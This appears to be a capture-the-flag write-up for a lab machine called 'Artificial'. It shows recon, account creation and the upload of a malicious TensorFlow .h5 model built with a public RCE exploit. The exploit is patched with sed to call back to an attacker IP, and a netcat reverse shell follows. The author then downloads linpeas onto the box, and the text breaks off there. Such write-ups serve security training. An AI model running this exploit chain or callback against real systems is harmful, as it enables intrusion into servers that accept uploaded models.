I find a webserver with nmap:
```
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Artificial - AI Solutions
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

I also find a few paths with gobuster:
```
/dashboard            (Status: 302) [Size: 199] [--> /login]
/logout               (Status: 302) [Size: 189] [--> /]
/login                (Status: 200) [Size: 857]
/register             (Status: 200) [Size: 952]
```

I get more informations with nikto:
```
+ HEAD nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
```

And even more informations with whatweb:
```
Summary   : HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], Matomo, nginx[1.18.0], Script
```

I decide to create a new account:
```
POST /register HTTP/1.1
Host: artificial.htb
Content-Length: 67
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://artificial.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/register
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=random4321&email=random4321%40mail.net&password=random4321
```
Then, I log in using the previously created account:
```
POST /login HTTP/1.1
Host: artificial.htb
Content-Length: 47
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://artificial.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

email=random4321%40mail.net&password=random4321
```

I get a dashboard:
```
GET /dashboard HTTP/1.1
Host: artificial.htb
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo3LCJ1c2VybmFtZSI6InJhbmRvbTQzMjEifQ.aJZgPw.oEFDyLs3mb8ucwx9O6sCQaq7uY4
Connection: keep-alive
```

Once logged in, I also get a JWT token:
```
{
  "user_id": 7,
  "username": "random4321"
}
```

I decide to look at the dashboard source code:
```
<main>
    <section class="dashboard-section">
        <h2>Your Models</h2>
        <p style="color: black;">Upload, manage, and run your AI models here.</p>
        
        <!-- Warning message for TensorFlow version -->
        <p class="version-warning">Please ensure these <a href="/static/requirements.txt">requirements</a> are installed when building your model, or use our <a href="/static/Dockerfile">Dockerfile</a> to build the needed environment with ease.  </p>

        <!-- Upload form -->
        <form id="upload-form" enctype="multipart/form-data" action="/upload_model" method="POST">
            <input type="file" name="model_file" accept=".h5" class="file-input" required="">
            <button type="submit" class="btn" style="color: white;">Upload Model</button>
        </form>

        <!-- List models -->
        <ul class="model-list">
            
        </ul>
    </section>
</main>
```


I find 2 files, requirements.txt (python dependencies file):
```
tensorflow-cpu==2.13.1
```

And a Dockerfile that download the same package during the build phase:
static/Dockerfile content:
```
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

This looks like it can be used with the example python code I found on home page earlier to generate a h5 model to upload:
```
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

After some digging on the web I find this RCE exploit for Tensorflow 2.13.1: `https://github.com/Splinter0/tensorflow-rce`

I add this to the `Dockerfile` build phase to download the RCE exploit and create a malicious h5 model file containing a payload:
```
# Download the Tensorflow 2.13.1 RCE exploit
RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py

# Replace the attacker IP and port
RUN sed -i 's/127.0.0.1/10.10.14.9/g' exploit.py && sed -i 's/6666/4444/g' exploit.py

# Generate the malicious h5 model file containing the payload
RUN python exploit.py
```

Then, I use the `Dockerfile` to build and create a container containing the infected h5 file.
#### generate-payload.sh
```
#!/bin/bash

# Enable and start Docker service
sudo systemctl enable docker.service && sudo systemctl start docker.service

# Build image (and generate payload)
sudo docker build -t generate-h5-payload .

# Run container
sudo docker run generate-h5-payload

# Get container id
CONTAINER_ID=$(sudo docker container ls -aq --filter "ancestor=generate-h5-payload")

# Download payload from container
sudo docker cp $CONTAINER_ID:/code/exploit.h5 ./exploit.h5
```

Once that's done, I upload the infected .h5:
```
POST /upload_model HTTP/1.1
Host: artificial.htb
Content-Length: 10149
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://artificial.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTicDHAyJc5Hia94Y
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.tHU1-Tac2fUPZ92LKzRzetX4GbE
Connection: keep-alive

------WebKitFormBoundaryTicDHAyJc5Hia94Y
Content-Disposition: form-data; name="model_file"; filename="exploit.h5"
Content-Type: application/x-hdf

[placeholder for file blob]
------WebKitFormBoundaryTicDHAyJc5Hia94Y--
```

Then, I start a netcat listener:
```
nc -lvnp 4444
listening on [any] 4444 ...
```

Finally, I run the model from the dashboard:
```
GET /run_model/ef74c658-cbcf-4601-96c6-965fd87e6788 HTTP/1.1
Host: artificial.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://artificial.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImhhY2tlckBodGIuY29tIn0.aJ9_0w.tHU1-Tac2fUPZ92LKzRzetX4GbE
Connection: keep-alive
```

The payload is executed and I get a connection on the netcat listener:
```
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 56218
/bin/sh: 0: can't access tty; job control turned off
$ whoami && pwd && ls -la
app
/home/app/app
total 36
drwxrwxr-x 7 app app 4096 Jun  9 13:56 .
drwxr-x--- 6 app app 4096 Jun  9 10:52 ..
-rw-rw-r-- 1 app app 7846 Jun  9 13:54 app.py
drwxr-xr-x 2 app app 4096 Aug 15 18:45 instance
drwxrwxr-x 2 app app 4096 Aug 15 18:45 models
drwxr-xr-x 2 app app 4096 Jun  9 13:55 __pycache__
drwxrwxr-x 4 app app 4096 Jun  9 13:57 static
drwxrwxr-x 2 app app 4096 Jun 18 13:21 templates
```

Once inside the box, we need to run linpeas.

To do this, we first need to serve linpeas:
```
#!/bin/bash

# Create directory to expose only linpeas script file
mkdir linpeas && cd linpeas

# Download latest version of linpeas
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Start web server on port 8888 to serve latest linpeas script file
sudo python3 -m http.server 8888
```

Then, we copy linpeas on the box and run it:
```
$ cd /tmp
$ wget 10.10.14.9:8888/linpeas.sh
--2025-08-15 18:54:06--  http://10.10.14.9:8888/linpeas.sh
Connecting to 10.10.14.9:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 956174 (934K) [text/x-sh]
Saving to: ‘linpeas.sh’

     0K .......... .......... .......... .......... ..........  5% 1.21M 1s
    50K .......... .......... .......... .......... .......... 10% 2.46M 1s
   100K .......... .......... .......... .......... .......... 16% 26.0M 0s
   150K .......... .......... .......... .......... .......... 21% 2.75M 0s
   200K .......... .......... .......... .......... .......... 26% 28.1M 0s
   250K .......... .......... .......... .......... .......... 32% 24.9M 0s
   300K .......... .......... .......... .......... .......... 37% 14.3M 0s
   350K .......... .......... .......... .......... .......... 42% 35.0M 0s
   400K .......... .......... .......... .......... .......... 48% 3.43M 0s
   450K .......... .......... .......... .......... .......... 53% 21.8M 0s
   500K .......... .......... .......... .......... .......... 58% 43.9M 0s
   550K .......... .......... .......... .......... .......... 64% 22.0M 0s
   600K .......... .......... .......... .......... .......... 69% 37.7M 0s
   650K .......... .......... .......... .......... .......... 74% 44.3M 0s
   700K .......... .......... .......... .......... .......... 80% 10.2M 0s
   750K .......... .......... .......... .......... .......... 85% 47.9M 0s
   800K .......... .......... .......... .......... .......... 91% 8.00M 0s
   850K .......... .......... .......... .......... .......... 96% 36.3M 0s
   900K .......... .......... .......... ...                  100% 25.4M=0.1s

2025-08-15 18:54:06 (7.29 MB/s) - ‘linpeas.sh’ saved [956174/956174]

$ chmod +x linpeas.sh
```
